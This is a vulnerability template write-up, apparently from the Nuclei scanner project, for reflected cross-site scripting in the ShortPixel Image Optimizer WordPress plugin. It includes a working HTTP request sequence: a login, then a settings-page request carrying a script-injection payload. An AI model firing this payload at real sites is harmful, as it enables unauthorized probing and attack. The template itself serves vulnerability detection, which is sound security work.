# Nuclei Template: WordPress ShortPixel Image Optimizer <4.22.10 - Cross-Site Scripting
**Template ID:** shortpixel-image-optimizer-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`shortpixel-image-optimizer-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress ShortPixel Image Optimizer 4.22.10 does not escape generated URLs before outputting them back in an attribute, leading to reflected cross-site scripting.

## Steps to reproduce / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/options-general.php?page=wp-shortpixel-settings&"><script>alert(1)</script> HTTP/1.1
Host: {{Hostname}}
```

## References
- https://wpscan.com/vulnerability/8a0ddd14-7260-4fb6-bb87-2916aa41ff01
- https://wordpress.org/plugins/shortpixel-image-optimiser
